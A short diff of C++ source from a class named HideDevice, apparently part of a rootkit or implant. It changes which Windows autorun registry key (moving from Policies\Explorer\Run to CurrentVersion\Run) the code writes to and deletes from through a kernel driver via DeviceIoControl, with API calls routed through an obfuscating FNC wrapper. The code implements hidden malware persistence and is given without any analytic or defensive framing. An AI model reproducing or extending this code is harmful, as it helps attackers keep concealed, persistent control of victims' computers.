@@ -481,10 +481,12 @@ BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value)
 #ifdef RUN_ONCE_KEY
 	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", user_sid);
 #else
-	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", user_sid);
+	// XXX-NEWREG
+	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
 #endif
-	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) 
-		FNC(RegCloseKey)(hOpen);
+	// XXX-NEWREG
+	//if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) 
+		//FNC(RegCloseKey)(hOpen);
 
 	ret_val = FNC(DeviceIoControl)(hFile, IOCTL_REG, &reg_struct, sizeof(reg_struct), NULL, 0, &dummy, NULL);	
 	return ret_val;
@@ -533,7 +535,8 @@ BOOL HideDevice::unhook_regdeleteW(WCHAR *value_name)
 #ifdef RUN_ONCE_KEY
 	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", user_sid);
 #else
-	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", user_sid);
+	// XXX-NEWREG
+	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
 #endif
 	ret_val = FNC(DeviceIoControl)(hFile, IOCTL_REG, &reg_struct, sizeof(reg_struct), NULL, 0, &dummy, NULL);	
 	return ret_val;
